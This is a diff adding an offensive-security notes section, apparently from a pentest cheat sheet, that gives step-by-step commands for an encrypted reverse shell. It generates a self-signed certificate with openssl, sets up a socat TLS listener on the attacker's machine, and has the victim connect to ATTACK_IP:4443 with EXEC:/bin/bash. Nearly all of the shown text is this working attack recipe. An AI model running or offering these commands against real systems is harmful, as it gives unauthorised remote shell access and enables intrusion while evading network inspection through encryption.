@@ -80,4 +80,22 @@
 
 #### 4) Checkmark "Uppercase hex with a padding of 4"
 
+## 2nd Technique example
+
+### Encrypted reverse shell steps:
+
+### 1) Create the key
+
+### 2) Listen on the attacker's machine
+
+### 3) Connect to the attacker's machine
+
+#### 1) openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.example.gr/O=example COM/C=GR' -nodes -keyout gr-reverse.key -out gr-reverse.crt
+
+#### 2) cat gr-reverse.key gr-reverse.crt > gr-reverse.pem
+
+#### 3) socat -d -d OPENSSL-LISTEN:4443,cert=gr-reverse.pem,verify=0,fork STDOUT
+
+#### 4) Victim: socat OPENSSL:ATTACK_IP:4443,verify=0 EXEC:/bin/bash
+
 
